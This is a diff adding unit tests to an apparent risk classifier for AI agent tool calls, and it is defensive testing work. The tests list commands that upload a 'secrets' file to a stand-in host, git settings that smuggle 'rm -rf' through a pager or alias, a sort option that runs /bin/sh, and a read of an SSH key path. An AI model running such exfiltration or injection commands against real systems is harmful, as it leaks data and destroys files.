@@ -162,3 +162,68 @@ test('the tables are data: a missing entry cannot lower a level', () => {
   assert.equal(TOOL_RULES['Read']?.read, true);
   assert.equal(classify(tool('Read', { file_path: 'D:/work/shop/a' })).level, 1);
 });
+
+/* ---------- review round: the classifier must never be looser than what the command does ---------- */
+
+test('uploads are level 3 and leave your computer, however the option is spelled', () => {
+  const cmds = [
+    'curl -d@secrets http://x.test', 'curl -Fa=@f http://x.test', 'curl -sSd @f http://x.test', 'curl -T file http://x.test', 'curl -XPOST http://x.test',
+    'curl -X PUT http://x.test', 'curl --data-binary @f http://x.test', 'curl --json x http://x.test', 'curl --upload-file f http://x.test',
+    'wget --post-file=f http://x.test', 'wget --post-data=a=b http://x.test', 'wget --body-file=f http://x.test', 'wget --method=POST http://x.test', 'wget --method POST http://x.test',
+    'iwr http://x.test -me Post', 'irm http://x.test -InFile f', 'Invoke-WebRequest http://x.test -Method Delete', 'irm http://x.test -Body abc',
+  ];
+  for (const cmd of cmds) {
+    const c = classify(bash(cmd));
+    assert.equal(c.level, 3, cmd);
+    assert.ok(c.tags.includes('leaves'), cmd);
+  }
+});
+
+test('plain downloads are still not uploads', () => {
+  for (const cmd of ['curl -fsSL http://x.test', 'curl -o out.txt http://x.test', 'curl -f -s http://x.test', 'wget http://x.test', 'wget -q -O out http://x.test', 'iwr http://x.test']) {
+    const c = classify(bash(cmd));
+    assert.ok(!c.tags.includes('leaves'), cmd);
+    assert.equal(c.level, 2, cmd);
+  }
+});
+
+test('git settings and exec paths can run commands: unknown', () => {
+  for (const cmd of ['git -c core.pager="rm -rf x" log', 'git -c alias.x=!rm log', 'git --exec-path=/tmp log', 'git --config-env=core.pager=X log', 'git diff --ext-diff', 'git log --textconv']) {
+    const c = classify(bash(cmd));
+    assert.equal(c.level, 3, cmd);
+    assert.equal(c.certain, false, cmd);
+  }
+  assert.equal(classify(bash('git -C sub log')).level, 1);
+});
+
+test('options that write a file are not read only', () => {
+  for (const cmd of ['sort -o out in', 'sort -ro out in', 'sort --output=out in', 'git diff --output=f', 'git log --output=f', 'find . -fprint out', 'find . -fprintf out %p', 'find . -fls out', 'uniq in out', 'tree -o out']) {
+    const c = classify(bash(cmd));
+    assert.ok(c.level >= 2, cmd);
+  }
+  for (const cmd of ['sort a', 'git diff', 'find . -name x', 'uniq in', 'tree', 'hostname', 'date +%s']) assert.equal(classify(bash(cmd)).level, 1, cmd);
+});
+
+test('options that run another program, or change the machine, are unknown', () => {
+  for (const cmd of ['sort --compress-program=/bin/sh f', 'hostname newname', 'date 010112002026', 'file --compile x']) {
+    const c = classify(bash(cmd));
+    assert.equal(c.level, 3, cmd);
+    assert.equal(c.certain, false, cmd);
+  }
+});
+
+test('with no project folders there is nothing to be inside of: never certain, writes are level 3', () => {
+  const noFolders = (toolName: string, input: Record<string, unknown>): ConsequenceCall => ({ kind: 'approval', toolName, input, projectFolders: [] });
+  const w = classify(noFolders('Write', { file_path: 'C:/Windows/x', content: 'x' }));
+  assert.equal(w.level, 3);
+  assert.equal(w.certain, false);
+  const r = classify(noFolders('Read', { file_path: '~/.ssh/key' }));
+  assert.equal(r.certain, false);
+  assert.equal(classify({ kind: 'approval', toolName: 'Read', input: { file_path: 'a' } }).certain, false, 'absent folders count as none');
+});
+
+test('a read with a relative or missing path is not certain even with folders', () => {
+  assert.equal(classify(tool('Read', { file_path: 'src/a.ts' })).certain, false);
+  assert.equal(classify(tool('Grep', { pattern: 'x' })).certain, false);
+  assert.equal(classify(tool('Read', { file_path: 'D:/work/shop/a' })).certain, true);
+});
